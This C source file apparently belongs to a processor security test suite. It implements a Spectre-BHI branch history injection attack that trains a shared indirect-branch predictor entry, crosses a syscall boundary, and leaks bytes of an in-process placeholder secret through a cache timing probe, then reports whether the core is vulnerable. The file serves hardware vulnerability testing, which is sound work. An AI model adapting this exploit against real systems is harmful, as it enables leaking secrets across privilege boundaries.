/**
 * spectre-bhi: Branch History Injection (Spectre-BHB / BHI).
 *
 * BHI exploits the fact that branch-history state is shared across contexts
 * even when branch-target state is isolated.  The core keeps no ASID/privilege
 * tag on its GHR/PHR and never clears them on context switch
 * (RAPT_SFENCE_KEEP_STATE=3), so an attacker can inject a branch history that
 * makes a victim indirect branch alias an attacker-trained ITT entry
 * (idx = pc[5:1]^ghr[4:0]).  The attacker primes the history with a fixed
 * branch chain, trains the shared ITT entry to a gadget, crosses a syscall
 * boundary, and the victim's indirect branch transiently redirects to it.
 * Multi-byte: the gadget leaks secret_str[leak_index].
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 60
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif
#define TRAIN_ROUNDS 30

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));
static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";
static volatile uint32_t leak_index;

__attribute__((noinline))
static void gadget_secret(void) {
  volatile uint8_t t =
      probe_array[(uintptr_t)(uint8_t)secret_str[leak_index] * SC_PROBE_STRIDE];
  (void)t;
}
__attribute__((noinline))
static void gadget_null(void) {
  volatile uint8_t t = probe_array[0];
  (void)t;
}
__attribute__((noinline))
static void benign(void) { asm volatile("nop"); }

static void *tgt_attack;
static void *tgt_victim;
static sc_alias_t al;

static inline void ctx_syscall(void) {
  register long a7 asm("a7") = 172;
  register long a0 asm("a0") = 0;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
}

/* Inject a fixed branch history (the BHI primitive): a chain of taken
 * branches populates GHR/PHR with an attacker-controlled value. */
static void inject_history(void) {
  sc_hist_prime();
}

static void inject_round(const sc_geom_t *g) {
  sc_evict_capacity(g);
  volatile uint8_t sink = (uint8_t)secret_str[leak_index];
  (void)sink;
  sc_fence();
  inject_history();
  al.b(&tgt_victim);          /* populate victim BTB INDR entry */
  for (int t = 0; t < TRAIN_ROUNDS; t++) {
    inject_history();         /* attacker-controlled history */
    al.a(&tgt_attack);        /* train shared ITT entry to gadget */
  }
  ctx_syscall();              /* cross-context: history must survive */
  inject_history();
  al.b(&tgt_victim);          /* victim mispredicts under injected history */
  sc_fence();
}

static int read_byte(int idx, const sc_geom_t *g, uint32_t tries,
                     uint32_t *score) {
  leak_index = (uint32_t)idx;
  tgt_attack = (void *)gadget_secret;
  tgt_victim = (void *)benign;
  sc_score_t atk;
  sc_score_reset(&atk);
  for (uint32_t t = 0; t < tries; t++) {
    inject_round(g);
    sc_probe_array(probe_array, g, &atk, 0x2222 + t);
    atk.rounds++;
  }
  int best = sc_argmax(&atk);
  *score = atk.hits[best];
  return best;
}

int main(void) {
  if (sc_time_selfcheck("spectre-bhi") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-bhi ERROR reason=evict\n");
    return 1;
  }
  if (sc_alias_make(&al, SC_DELTA_ITT, sc_itt_stub, sc_itt_stub_len()) != 0) {
    printf("SCRESULT spectre-bhi SKIP reason=no-alias-arena\n");
    return 0;
  }
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;
  leak_index = 0;
  int expect = (uint8_t)secret_str[0];

  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    gadget_secret();
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0xb0b + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[expect] >= R / 2;

  uint8_t recovered[SECURITY_SECRET_LEN];
  uint32_t scores[SECURITY_SECRET_LEN];
  int matched = 0;
  printf("[spectre-bhi] leaking %d bytes via history injection:\n",
         SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    int got = read_byte(i, &g, R, &scores[i]);
    recovered[i] = (uint8_t)got;
    int ok = (got == (uint8_t)secret_str[i]);
    matched += ok;
    printf("  [%2d] want=0x%02x got=0x%02x score=%u/%u %s\n",
           i, (uint8_t)secret_str[i], got, (unsigned)scores[i],
           (unsigned)R, ok ? "OK" : "miss");
  }

  leak_index = 0;
  sc_score_t atk, nul;
  sc_score_reset(&atk);
  sc_score_reset(&nul);
  for (uint32_t r = 0; r < R; r++) {
    tgt_attack = (void *)gadget_secret;
    tgt_victim = (void *)benign;
    inject_round(&g);
    sc_probe_array(probe_array, &g, &atk, 0x2222 + r);
    atk.rounds++;
    tgt_attack = (void *)gadget_null;
    inject_round(&g);
    sc_probe_array(probe_array, &g, &nul, 0x3333 + r);
    nul.rounds++;
  }
  sc_decision_t d = sc_decide(&atk, &nul, expect, pos_ok);
  sc_result("spectre-bhi", &d, pos_ok, expect, R, &g);
  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT spectre-bhi-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  printf("[spectre-bhi] recovered %d/%d bytes: ", matched, SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    putchar((recovered[i] > 31 && recovered[i] < 127) ? recovered[i] : '?');
  putchar('\n');
  if (multibit_ok || d.verdict == SC_VULNERABLE)
    printf("[spectre-bhi] VULNERABLE: branch history injection leak\n");
  else if (!pos_ok)
    printf("[spectre-bhi] INCONCLUSIVE: positive control failed\n");
  else
    printf("[spectre-bhi] NOT VULNERABLE or insufficient signal\n");
  sc_alias_free(&al);
  return 0;
}